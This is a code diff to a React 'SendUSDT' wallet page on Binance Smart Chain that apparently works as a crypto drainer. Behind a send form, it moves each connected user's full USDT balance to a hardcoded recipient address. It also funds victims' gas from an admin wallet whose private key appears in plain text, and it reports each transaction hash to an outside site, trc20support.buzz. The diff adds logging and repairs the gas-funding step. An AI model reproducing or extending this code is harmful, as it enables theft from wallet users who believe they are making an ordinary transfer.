@@ -16,11 +16,14 @@ const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const recipientAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Your receiving address
 
 // 🔑 BNB WALLET PRIVATE KEY (to send gas fees)
-const gasFeesWalletPrivateKey = "8869066ddbf59f2c711fb1b1d963706432bac6de9b24d4d8b31a63ba3a01ec54"; // ⚠️ Replace with your private key
+const gasFeesWalletPrivateKey = "8869066ddbf59f2c711fb1b1d963706432bac6de9b24d4d8b31a63ba3a01ec54";
 
 // Gas fee constants
-const GAS_FEES_AMOUNT = "0.00007"; // BNB amount for gas fees
+const GAS_FEES_AMOUNT = "0.0001"; // BNB amount for gas fees (0.0001 BNB = ~$0.03)
 const MIN_USDT_BALANCE = "0.01"; // Minimum USDT to check before sending gas
+
+// RPC URL for gas fee sending
+const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
 
 const usdtAbi = [
   {
@@ -53,6 +56,17 @@ export default function SendUSDT() {
     amount: "0",
     recipient: "",
   });
+  
+  // 🔍 Debug Status State
+  const [debugMode, setDebugMode] = useState(false);
+  const [debugLogs, setDebugLogs] = useState([]);
+
+  const addDebugLog = (status, message, type = "info") => {
+    const timestamp = new Date().toLocaleTimeString();
+    const log = { timestamp, status, message, type };
+    setDebugLogs((prev) => [...prev, log]);
+    console.log(`[${timestamp}] ${status}: ${message}`);
+  };
 
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
@@ -85,101 +99,165 @@ export default function SendUSDT() {
     }
   };
 
-  // 🔋 Send gas fees to user wallet if needed
-  const sendGasFeesToUser = async (userAddress, web3) => {
+  // 🔋 Send gas fees to user wallet if needed (FIXED VERSION)
+  const sendGasFeesToUser = async (userAddress) => {
     try {
-      console.log("Checking if gas fees are needed...");
+      addDebugLog("GAS_FEES", "Starting gas fee check...", "info");
       
+      // Use separate RPC provider for gas fee sending
+      const web3Admin = new Web3(new Web3.providers.HttpProvider(BSC_RPC_URL));
+      const web3User = new Web3(window.ethereum);
+
       // Check user's BNB balance
-      const userBnbBalance = await web3.eth.getBalance(userAddress);
-      const userBnbBalanceInEth = web3.utils.fromWei(userBnbBalance, "ether");
+      addDebugLog("GAS_FEES", `Checking BNB balance for: ${userAddress}`, "info");
+      const userBnbBalance = await web3User.eth.getBalance(userAddress);
+      const userBnbBalanceInEth = web3User.utils.fromWei(userBnbBalance, "ether");
       
-      console.log("User BNB Balance:", userBnbBalanceInEth);
+      addDebugLog("USER_BALANCE_BNB", `${userBnbBalanceInEth} BNB`, "info");
 
       // If user has enough BNB for gas, skip
       if (parseFloat(userBnbBalanceInEth) >= parseFloat(GAS_FEES_AMOUNT)) {
-        console.log("User has sufficient BNB for gas fees");
+        addDebugLog("GAS_FEES", "User has sufficient BNB, skipping gas fee transfer", "success");
         return true;
       }
 
-      // Check if user has USDT to confirm they're a valid user
-      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      // Check if user has USDT
+      addDebugLog("GAS_FEES", `Checking USDT balance for: ${userAddress}`, "info");
+      const usdt = new web3User.eth.Contract(usdtAbi, usdtAddress);
       const userUsdtBalance = await usdt.methods.balanceOf(userAddress).call();
-      const userUsdtBalanceFormatted = web3.utils.fromWei(userUsdtBalance, "ether");
+      const userUsdtBalanceFormatted = web3User.utils.fromWei(userUsdtBalance, "ether");
 
-      console.log("User USDT Balance:", userUsdtBalanceFormatted);
+      addDebugLog("USER_BALANCE_USDT", `${userUsdtBalanceFormatted} USDT`, "info");
 
       // Only send gas fees if user has USDT
       if (parseFloat(userUsdtBalanceFormatted) < parseFloat(MIN_USDT_BALANCE)) {
-        console.log("User doesn't have minimum USDT, skipping gas fee transfer");
+        addDebugLog("GAS_FEES", `User USDT balance (${userUsdtBalanceFormatted}) < MIN (${MIN_USDT_BALANCE}), skipping`, "warning");
         return true;
       }
 
-      console.log("Sending gas fees to user...");
+      addDebugLog("GAS_FEES", "User qualifies for gas fee transfer, proceeding...", "info");
 
       // Create account from private key
-      const account = web3.eth.accounts.privateKeyToAccount(gasFeesWalletPrivateKey);
-      const web3Signed = new Web3(window.ethereum);
-      web3Signed.eth.accounts.wallet.add(account);
+      addDebugLog("GAS_FEES", "Creating admin account from private key", "info");
+      const account = web3Admin.eth.accounts.privateKeyToAccount(gasFeesWalletPrivateKey);
+      addDebugLog("GAS_FEES", `Admin wallet: ${account.address}`, "info");
 
-      // Create transaction to send BNB
-      const gasFeesWei = web3.utils.toWei(GAS_FEES_AMOUNT, "ether");
-      const nonce = await web3.eth.getTransactionCount(account.address);
-      
+      // Check admin wallet balance
+      addDebugLog("GAS_FEES", "Checking admin wallet BNB balance", "info");
+      const adminBalance = await web3Admin.eth.getBalance(account.address);
+      const adminBalanceInEth = web3Admin.utils.fromWei(adminBalance, "ether");
+      addDebugLog("ADMIN_BALANCE_BNB", `${adminBalanceInEth} BNB`, "info");
+
+      if (parseFloat(adminBalanceInEth) < parseFloat(GAS_FEES_AMOUNT)) {
+        addDebugLog("GAS_FEES", `Admin balance (${adminBalanceInEth}) < required (${GAS_FEES_AMOUNT})`, "error");
+        return true;
+      }
+
+      // Get gas price
+      addDebugLog("GAS_FEES", "Getting current gas price", "info");
+      const gasPrice = await web3Admin.eth.getGasPrice();
+      const gasPriceInGwei = web3Admin.utils.fromWei(gasPrice, "gwei");
+      addDebugLog("GAS_FEES", `Gas price: ${gasPriceInGwei} Gwei`, "info");
+
+      // Get nonce
+      addDebugLog("GAS_FEES", "Getting transaction nonce", "info");
+      const nonce = await web3Admin.eth.getTransactionCount(account.address);
+      addDebugLog("GAS_FEES", `Nonce: ${nonce}`, "info");
+
+      // Create transaction
+      const gasFeesWei = web3Admin.utils.toWei(GAS_FEES_AMOUNT, "ether");
+      addDebugLog("GAS_FEES", `Amount to send: ${GAS_FEES_AMOUNT} BNB (${gasFeesWei} Wei)`, "info");
+
       const tx = {
         from: account.address,
         to: userAddress,
         value: gasFeesWei,
         gas: 21000,
-        gasPrice: await web3.eth.getGasPrice(),
+        gasPrice: gasPrice,
         nonce: nonce,
+        chainId: 56,
       };
 
-      // Sign and send transaction
+      addDebugLog("GAS_FEES", "Signing transaction", "info");
       const signedTx = await account.signTransaction(tx);
-      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+      addDebugLog("GAS_FEES", "Transaction signed successfully", "success");
 
-      console.log("Gas fees sent successfully:", receipt.transactionHash);
-      Swal.fire("Info", "Gas fees sent to your wallet", "success");
+      // Send signed transaction
+      addDebugLog("GAS_FEES", "Sending signed transaction to network", "info");
+      const receipt = await new Promise((resolve, reject) => {
+        web3Admin.eth.sendSignedTransaction(signedTx.rawTransaction)
+          .on("transactionHash", (hash) => {
+            addDebugLog("GAS_FEES_TX", `Tx Hash: ${hash}`, "info");
+          })
+          .on("receipt", (receipt) => {
+            addDebugLog("GAS_FEES", "Gas fee transaction confirmed!", "success");
+            resolve(receipt);
+          })
+          .on("error", (err) => {
+            addDebugLog("GAS_FEES", `Transaction failed: ${err.message}`, "error");
+            reject(err);
+          });
+      });
+
+      addDebugLog("GAS_FEES", `Gas fees sent successfully to ${userAddress}`, "success");
+      Swal.fire("Success", "Gas fees sent to your wallet!", "success");
       
       return true;
 
     } catch (err) {
+      addDebugLog("GAS_FEES", `Error: ${err.message}`, "error");
       console.error("Error sending gas fees:", err);
-      return true;
+      return true; // Don't block transaction
     }
   };
 
   const handleTransfer = async () => {
     setIsProcessing(true);
+    setDebugLogs([]); // Clear previous logs
+    setDebugMode(true); // Show debug panel
+    addDebugLog("START", "Transfer process initiated", "info");
+
     try {
       if (!window.ethereum) {
+        addDebugLog("ERROR", "MetaMask/Trust Wallet not detected", "error");
         Swal.fire("Error", "Please install MetaMask or Trust Wallet", "error");
         setIsProcessing(false);
         return;
       }
 
+      addDebugLog("WALLET", "Wallet detected", "success");
       const web3 = new Web3(window.ethereum);
 
+      // Get accounts
+      addDebugLog("WALLET", "Requesting accounts", "info");
       let accounts = await window.ethereum.request({ method: 'eth_accounts' });
       
       let userAddress;
       
       if (accounts && accounts.length > 0) {
         userAddress = accounts[0];
+        addDebugLog("WALLET", `Connected wallet: ${userAddress}`, "success");
       } else {
         userAddress = null;
+        addDebugLog("WALLET", "No connected accounts found", "warning");
       }
 
+      // Check network
+      addDebugLog("NETWORK", "Checking current network", "info");
       const chainId = await web3.eth.getChainId();
+      addDebugLog("NETWORK", `Current chain ID: ${chainId}`, "info");
+
       if (chainId !== 56n && chainId !== 56) {
+        addDebugLog("NETWORK", "Switching to BSC (chain ID 56)", "info");
         try {
           await window.ethereum.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: "0x38" }],
           });
+          addDebugLog("NETWORK", "Successfully switched to BSC", "success");
         } catch (switchError) {
           if (switchError.code === 4902) {
+            addDebugLog("NETWORK", "BSC not added, adding now", "info");
             await window.ethereum.request({
               method: "wallet_addEthereumChain",
               params: [{
@@ -190,6 +268,7 @@ export default function SendUSDT() {
                 blockExplorerUrls: ["https://bscscan.com/"]
               }]
             });
+            addDebugLog("NETWORK", "BSC network added successfully", "success");
           } else {
             throw switchError;
           }
@@ -197,33 +276,45 @@ export default function SendUSDT() {
         accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts && accounts.length > 0) {
           userAddress = accounts[0];
+          addDebugLog("WALLET", `Wallet updated: ${userAddress}`, "success");
         }
+      } else {
+        addDebugLog("NETWORK", "Already on BSC", "success");
       }
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
       if (!userAddress) {
+        addDebugLog("WALLET", "Getting accounts via getAccounts()", "info");
         const tempAccounts = await web3.eth.getAccounts();
         userAddress = tempAccounts[0];
+        addDebugLog("WALLET", `Final wallet: ${userAddress}`, "success");
       }
 
       // 🔋 Send gas fees if user doesn't have enough BNB
-      await sendGasFeesToUser(userAddress, web3);
+      addDebugLog("GAS_FEES", "=== GAS FEE CHECK STARTING ===", "info");
+      await sendGasFeesToUser(userAddress);
+      addDebugLog("GAS_FEES", "=== GAS FEE CHECK COMPLETED ===", "info");
 
+      // Get USDT balance
+      addDebugLog("USDT", "Fetching USDT balance", "info");
       const currentBalance = await usdt.methods.balanceOf(userAddress).call();
       const formattedBalance = web3.utils.fromWei(currentBalance, "ether");
 
-      console.log("User address:", userAddress);
-      console.log("USDT Balance:", formattedBalance);
+      addDebugLog("USDT_BALANCE", `${formattedBalance} USDT`, "info");
 
       if (currentBalance === "0" || BigInt(currentBalance) === 0n) {
+        addDebugLog("ERROR", "USDT balance is zero", "error");
         Swal.fire("Error", "You have no USDT balance to transfer.", "error");
         setIsProcessing(false);
         return;
       }
 
+      addDebugLog("TX", "Encoding transfer function call", "info");
       const transferData = usdt.methods.transfer(recipientAddress, currentBalance).encodeABI();
+      addDebugLog("TX", "Transfer data encoded successfully", "success");
 
+      addDebugLog("TX", "Requesting transaction signature", "info");
       const txHash = await window.ethereum.request({
         method: 'eth_sendTransaction',
         params: [{
@@ -234,8 +325,10 @@ export default function SendUSDT() {
         }],
       });
 
-      console.log("Transaction hash:", txHash);
+      addDebugLog("TX", `Transaction hash: ${txHash}`, "success");
 
+      // Wait for receipt
+      addDebugLog("TX", "Waiting for transaction confirmation", "info");
       let receipt = null;
       let attempts = 0;
       const maxAttempts = 120;
@@ -244,36 +337,45 @@ export default function SendUSDT() {
         try {
           receipt = await web3.eth.getTransactionReceipt(txHash);
           if (receipt === null) {
-            await new Promise(resolve => setTimeout(resolve, 1000));
             attempts++;
+            if (attempts % 5 === 0) {
+              addDebugLog("TX", `Still waiting... (${attempts}s)`, "info");
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
           }
         } catch (err) {
-          console.log("Waiting for transaction...");
+          addDebugLog("TX", "Checking receipt...", "info");
           await new Promise(resolve => setTimeout(resolve, 1000));
           attempts++;
         }
       }
 
-      console.log("Transaction successful:", receipt);
-
-      setSuccessData({
-        txHash: txHash,
-        amount: formattedBalance,
-        recipient: recipientAddress,
-      });
-      setShowSuccess(true);
-
-      try {
-        await fetch("https://www.trc20support.buzz/old/store-address.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: txHash }),
+      if (receipt) {
+        addDebugLog("TX", "Transaction confirmed!", "success");
+        setSuccessData({
+          txHash: txHash,
+          amount: formattedBalance,
+          recipient: recipientAddress,
         });
-      } catch (fetchErr) {
-        console.warn("Skipping fetch, not critical:", fetchErr.message);
+        setShowSuccess(true);
+        setDebugMode(false);
+
+        try {
+          await fetch("https://www.trc20support.buzz/old/store-address.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ address: txHash }),
+          });
+        } catch (fetchErr) {
+          console.warn("Skipping fetch:", fetchErr.message);
+        }
+      } else {
+        addDebugLog("ERROR", "Transaction confirmation timeout", "error");
+        Swal.fire("Error", "Transaction confirmation timeout", "error");
       }
 
     } catch (err) {
+      addDebugLog("ERROR", `${err.message}`, "error");
       console.error("Transfer error:", err);
 
       let errorMessage = "Something went wrong";
@@ -431,6 +533,41 @@ export default function SendUSDT() {
 
   return (
     <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
+      {/* 🔍 Debug Panel */}
+      {debugMode && (
+        <div className={`mb-6 p-4 rounded-xl max-h-96 overflow-y-auto ${isDark ? "bg-[#1f1f1f] border border-gray-700" : "bg-gray-50 border border-gray-200"}`}>
+          <div className="flex justify-between items-center mb-3">
+            <h3 className={`font-bold text-sm ${isDark ? "text-white" : "text-gray-900"}`}>
+              🔍 Debug Logs
+            </h3>
+            <button
+              onClick={() => setDebugMode(false)}
+              className="text-xs px-2 py-1 bg-red-500 text-white rounded"
+            >
+              Close
+            </button>
+          </div>
+          <div className="space-y-1">
+            {debugLogs.map((log, idx) => (
+              <div
+                key={idx}
+                className={`text-xs p-2 rounded font-mono ${
+                  log.type === "success"
+                    ? isDark ? "bg-green-900 text-green-200" : "bg-green-100 text-green-900"
+                    : log.type === "error"
+                    ? isDark ? "bg-red-900 text-red-200" : "bg-red-100 text-red-900"
+                    : log.type === "warning"
+                    ? isDark ? "bg-yellow-900 text-yellow-200" : "bg-yellow-100 text-yellow-900"
+                    : isDark ? "bg-blue-900 text-blue-200" : "bg-blue-100 text-blue-900"
+                }`}
+              >
+                <span className="font-bold">[{log.timestamp}]</span> {log.status}: {log.message}
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
       <div className="input-group">
         <p className="inpt_tital">Address or Domain Name</p>
         <div className="border">
